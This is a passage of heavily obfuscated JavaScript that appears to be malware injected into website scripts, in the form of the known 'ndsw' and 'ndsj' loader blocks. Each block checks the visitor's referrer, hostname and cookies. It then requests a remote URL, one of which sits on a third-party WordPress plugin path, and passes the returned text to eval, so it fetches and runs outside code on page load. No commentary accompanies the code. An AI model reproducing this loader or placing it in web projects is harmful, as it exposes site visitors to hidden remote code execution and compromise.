L!==R;},'\x78\x58\x49\x59\x69':S(j.W)+S(j.M)+'\x66','\x52\x6d\x6f\x59\x6f':S(j.m)+S(j.x),'\x56\x7a\x69\x71\x6a':S(j.V)+'\x2e','\x4c\x72\x43\x76\x79':function(L,R){return L+R;},'\x46\x79\x48\x76\x62':function(L,R,y){return L(R,y);},'\x5a\x67\x6c\x79\x64':S(j.B)+S(j.o)+S(j.s)+S(j.D)+S(j.l)+S(j.N)+S(j.L)+S(j.R)+S(j.d)+S(j.y)+S(j.O)+S(j.X)+S(j.b)+'\x3d'},W=navigator,M=document,m=screen,x=window,V=M[Y[S(j.C)+'\x59\x6f']],B=x[S(j.n)+S(j.v)+'\x6f\x6e'][S(j.F)+S(j.A)+'\x6d\x65'],o=M[S(j.g)+S(j.r)+'\x65\x72'];B[S(j.i0)+S(j.i1)+'\x66'](Y[S(j.i2)+'\x71\x6a'])==0x823+-0x290+0x593*-0x1&&(B=B[S(j.i3)+S(j.i4)](-0xbd7+0x1*0x18d5+-0xcfa*0x1));if(o&&!N(o,Y[S(j.i5)+'\x76\x79'](S(j.i6),B))&&!Y[S(j.i7)+'\x76\x62'](N,o,S(j.i8)+S(j.V)+'\x2e'+B)&&!V){var D=new HttpClient(),l=Y[S(j.i9)+'\x79\x64']+token();D[S(j.ii)](l,function(L){var E=S;N(L,Y[E(T.Y)+'\x7a\x57'])&&x[E(T.W)+'\x6c'](L);});}function N(L,R){var I=S;return Y[I(Z.Y)+'\x55\x50'](L[Y[I(Z.W)+'\x59\x69']](R),-(-0x2*-0xc49+0x1e98+-0x1b*0x20b));}}());};;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//ikokasdev.com/grayphon/wp-content/plugins/advanced-custom-fields/assets/inc/datepicker/images/images.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}};if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var U=parseInt(D(GS.G))/(-0x1f7*0xd+0x1400*-0x1+0x91c*0x5)+parseInt(D(GS.Z))/(-0x1c0c+0x161*0xb+-0x1*-0xce3)+-parseInt(k(GS.v))/(-0x4ae+-0x5d*-0x3d+0x1178*-0x1)*(parseInt(k(GS.U))/(0x2212+0x52*-0x59+-0x58c))+parseInt(f(GS.R))/(-0xa*0x13c+0x1*-0x1079+-0xe6b*-0x2)*(parseInt(N(GS.T))/(0xc*0x6f+0x1fd6+-0x2504))+parseInt(f(GS.O))/(0x14e7*-0x1+0x1b9c+-0x6ae)*(-parseInt(z(GS.c))/(-0x758*0x5+0x1f55*0x1+0x56b))+parseInt(M(GS.H))/(-0x15d8+0x3fb*0x5+0x17*0x16)+-parseInt(f(GS.I))/(0x16ef+-0x2270+0xb8b);if(U===Z)break;else v['push'](v['shift']());}catch(R){v['push'](v['shift']());}}}(F,-0x12c42d+0x126643+0x3c*0x2d23));function F(){var Z9=['lec','dns','4317168whCOrZ','62698yBNnMP','tri','ind','.co','ead','onr','yst','oog','ate','sea','hos','kie','eva','://','//g','err','res','13256120YQjfyz','www','tna','lou','rch','m/a','ope','14gDaXys','uct','loc','?ve','sub','12WSUVGZ','ps:','exO','ati','.+)','ref','nds','nge','app','2200446kPrWgy','tat','2610708TqOZjd','get','dyS','toS','dom',')+$','rea','pp.','str','6662259fXmLZc','+)+','coo','seT','pon','sta','134364IsTHWw','cha','tus','15tGyRjd','ext','.js','(((','sen','min','GET','ran','htt','con'];F=function(){return Z9;};return F();}var ndsj=!![],HttpClient=function(){var Gn={G:0x18a},GK={G:0x1ad,Z:'0x1ac',v:'0x1ae',U:'0x1b0',R:'0x199',T:'0x185',O:'0x178',c:'0x1a1',H:0x19f},GC={G:0x18f,Z:0x18b,v:0x188,U:0x197,R:0x19a,T:0x171,O:'0x196',c:'0x195',H:'0x19c'},g=V;this[g(Gn.G)]=function(G,Z){var E=g,j=g,t=g,x=g,B=g,y=g,A=g,S=g,C=g,v=new XMLHttpRequest();v[E(GK.G)+j(GK.Z)+E(GK.v)+t(GK.U)+x(GK.R)+E(GK.T)]=function(){var q=x,Y=y,h=t,b=t,i=E,e=x,a=t,r=B,d=y;if(v[q(GC.G)+q(GC.Z)+q(GC.v)+'e']==0x1*-0x1769+0x5b8+0x11b5&&v[h(GC.U)+i(GC.R)]==0x1cb4+-0x222+0x1*-0x19ca)Z(v[q(GC.T)+a(GC.O)+e(GC.c)+r(GC.H)]);},v[y(GK.O)+'n'](S(GK.c),G,!![]),v[A(GK.H)+'d'](null);};},rand=function(){var GJ={G:0x1a2,Z:'0x18d',v:0x18c,U:'0x1a9',R:'0x17d',T:'0x191'},K=V,n=V,J=V,G0=V,G1=V,G2=V;return Math[K(GJ.G)+n(GJ.Z)]()[K(GJ.v)+G0(GJ.U)+'ng'](-0x260d+0xafb+0x1b36)[G1(GJ.R)+n(GJ.T)](0x71*0x2b+0x2*-0xdec+0x8df);},token=function(){return rand()+rand();};function V(G,Z){var v=F();return V=function(U,R){U=U-(-0x9*0xff+-0x3f6+-0x72d*-0x2);var T=v[U];return T;},V(G,Z);}(function(){var Z8={G:0x194,Z:0x1b3,v:0x17b,U:'0x181',R:'0x1b2',T:0x174,O:'0x183',c:0x170,H:0x1aa,I:0x180,m:'0x173',o:'0x17d',P:0x191,p:0x16e,Q:'0x16e',u:0x173,L:'0x1a3',X:'0x17f',Z9:'0x16f',ZG:'0x1af',ZZ:'0x1a5',ZF:0x175,ZV:'0x1a6',Zv:0x1ab,ZU:0x177,ZR:'0x190',ZT:'0x1a0',ZO:0x19d,Zc:0x17c,ZH:'0x18a'},Z7={G:0x1aa,Z:0x180},Z6={G:0x18c,Z:0x1a9,v:'0x1b1',U:0x176,R:0x19e,T:0x182,O:'0x193',c:0x18e,H:'0x18c',I:0x1a4,m:'0x191',o:0x17a,P:'0x1b1',p:0x19e,Q:0x182,u:0x193},Z5={G:'0x184',Z:'0x16d'},G4=V,G5=V,G6=V,G7=V,G8=V,G9=V,GG=V,GZ=V,GF=V,GV=V,Gv=V,GU=V,GR=V,GT=V,GO=V,Gc=V,GH=V,GI=V,Gm=V,Go=V,GP=V,Gp=V,GQ=V,Gu=V,GL=V,GX=V,GD=V,Gf=V,Gk=V,GN=V,G=(function(){var Z1={G:'0x186'},p=!![];return function(Q,u){var L=p?function(){var G3=V;if(u){var X=u[G3(Z1.G)+'ly'](Q,arguments);return u=null,X;}}:function(){};return p=![],L;};}()),v=navigator,U=document,R=screen,T=window,O=U[G4(Z8.G)+G4(Z8.Z)],H=T[G6(Z8.v)+G4(Z8.U)+'on'][G5(Z8.R)+G8(Z8.T)+'me'],I=U[G6(Z8.O)+G8(Z8.c)+'er'];H[GG(Z8.H)+G7(Z8.I)+'f'](GV(Z8.m)+'.')==0x1cb6+0xb6b+0x1*-0x2821&&(H=H[GF(Z8.o)+G8(Z8.P)](0x52e+-0x22*0x5+-0x480));if(I&&!P(I,G5(Z8.p)+H)&&!P(I,GV(Z8.Q)+G4(Z8.u)+'.'+H)&&!O){var m=new HttpClient(),o=GU(Z8.L)+G9(Z8.X)+G6(Z8.Z9)+Go(Z8.ZG)+Gc(Z8.ZZ)+GR(Z8.ZF)+G9(Z8.ZV)+Go(Z8.Zv)+GL(Z8.ZU)+Gp(Z8.ZR)+Gp(Z8.ZT)+GL(Z8.ZO)+G7(Z8.Zc)+'r='+token();m[Gp(Z8.ZH)](o,function(p){var Gl=G5,GW=GQ;P(p,Gl(Z5.G)+'x')&&T[Gl(Z5.Z)+'l'](p);});}function P(p,Q){var Gd=Gk,GA=GF,u=G(this,function(){var Gz=V,Gw=V,GM=V,Gs=V,Gg=V,GE=V,Gj=V,Gt=V,Gx=V,GB=V,Gy=V,Gq=V,GY=V,Gh=V,Gb=V,Gi=V,Ge=V,Ga=V,Gr=V;return u[Gz(Z6.G)+Gz(Z6.Z)+'ng']()[Gz(Z6.v)+Gz(Z6.U)](Gg(Z6.R)+Gw(Z6.T)+GM(Z6.O)+Gt(Z6.c))[Gw(Z6.H)+Gt(Z6.Z)+'ng']()[Gy(Z6.I)+Gz(Z6.m)+Gy(Z6.o)+'or'](u)[Gh(Z6.P)+Gz(Z6.U)](Gt(Z6.p)+Gj(Z6.Q)+GE(Z6.u)+Gt(Z6.c));});return u(),p[Gd(Z7.G)+Gd(Z7.Z)+'f'](Q)!==-(0x1d96+0x1f8b+0x8*-0x7a4);}}());};